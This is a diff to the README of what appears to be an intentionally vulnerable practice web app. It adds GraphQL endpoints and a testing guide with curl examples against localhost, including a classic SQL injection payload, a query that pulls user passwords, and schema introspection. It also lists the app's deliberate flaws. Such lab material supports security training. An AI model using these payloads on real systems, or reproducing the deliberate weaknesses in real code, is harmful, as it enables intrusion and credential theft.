@@ -37,6 +37,7 @@ These pages require specific authentication or headers to access. All `/web/welc
 *   **`/web/ping`**: Network utility. Vulnerable to **Command Injection** via the `host` query parameter.
 *   **`/web/users`**: User search page. Vulnerable to **SQL Injection** via the `search` query parameter.
 *   **`/web/guestbook`**: Visitor guestbook. Vulnerable to **Reflected XSS** via the `name` query parameter.
+*   **`/web/graphql`**: GraphQL query interface (HTML form). Vulnerable to **SQL Injection**, **Schema Introspection**, and exposes **password field**.
 
 ### API Endpoints
 *   **`/swagger-ui`**: Interactive Swagger documentation for the API.
@@ -51,6 +52,139 @@ These pages require specific authentication or headers to access. All `/web/welc
 *   **`/api/v1/get-token`**: Authenticates with JSON payload and returns a Bearer token.
 *   **`/api/v1/get-token-form`**: Authenticates with Form data and returns a Bearer token.
 *   **`/api/v1/is-valid-token`**: Validates the Bearer token in the `token` header.
+*   **`/api/v1/graphql`**: GraphQL API endpoint (JSON). Vulnerable to **SQL Injection**, **Introspection**, exposes **password field**.
+*   **`/api/v1/graphql/schema`**: GraphQL schema introspection (returns JSON).
+
+---
+
+## GraphQL Testing Guide
+
+### GraphQL Endpoints
+
+*   **Web Interface:** `/web/graphql` (HTML form for testing)
+*   **JSON API:** `/api/v1/graphql` (accepts JSON POST requests)
+*   **Schema Export:** `/api/v1/graphql/schema` (introspection JSON)
+
+### Example Queries
+
+#### 1. Basic Query - Get All Users
+```graphql
+{
+  users {
+    id
+    username
+    email
+    bio
+  }
+}
+```
+
+**curl command:**
+```bash
+curl -X POST http://localhost:5000/api/v1/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ users { id username email bio } }"}'
+```
+
+#### 2. Search Users
+```graphql
+{
+  users(search: "admin") {
+    id
+    username
+    email
+    bio
+  }
+}
+```
+
+**curl command:**
+```bash
+curl -X POST http://localhost:5000/api/v1/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ users(search: \"admin\") { id username email bio } }"}'
+```
+
+#### 3. Get Single User with Password (Vulnerability!)
+```graphql
+{
+  user(id: 1) {
+    id
+    username
+    email
+    bio
+    password
+  }
+}
+```
+
+**curl command:**
+```bash
+curl -X POST http://localhost:5000/api/v1/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ user(id: 1) { id username email bio password } }"}'
+```
+
+#### 4. Schema Introspection (Discover Fields)
+```graphql
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
+}
+```
+
+**curl command:**
+```bash
+curl -X POST http://localhost:5000/api/v1/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'
+```
+
+**Or get schema directly:**
+```bash
+# Get introspection schema (JSON)
+curl http://localhost:5000/api/v1/graphql/schema
+```
+
+#### 5. SQL Injection via GraphQL
+```graphql
+{
+  users(search: "' OR '1'='1") {
+    id
+    username
+    email
+    bio
+  }
+}
+```
+
+**curl command:**
+```bash
+curl -X POST http://localhost:5000/api/v1/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ users(search: \"'\"'\" OR '\"'\"1'\"'\"='\"'\"1\") { id username email bio } }"}'
+```
+
+### GraphQL Vulnerabilities
+
+This GraphQL endpoint contains the following intentional vulnerabilities:
+
+1. **SQL Injection** - The `search`, `id`, and `username` parameters are vulnerable
+2. **Sensitive Data Exposure** - The `password` field is exposed in the schema
+3. **Introspection Enabled** - Attackers can discover all available queries and fields
+4. **No Query Depth Limiting** - Allows deeply nested queries (DoS potential)
+5. **No Query Complexity Analysis** - Allows expensive queries
+6. **No Rate Limiting** - Unlimited query execution
+7. **No Authentication** - GraphQL endpoint is publicly accessible
 
 ---
 
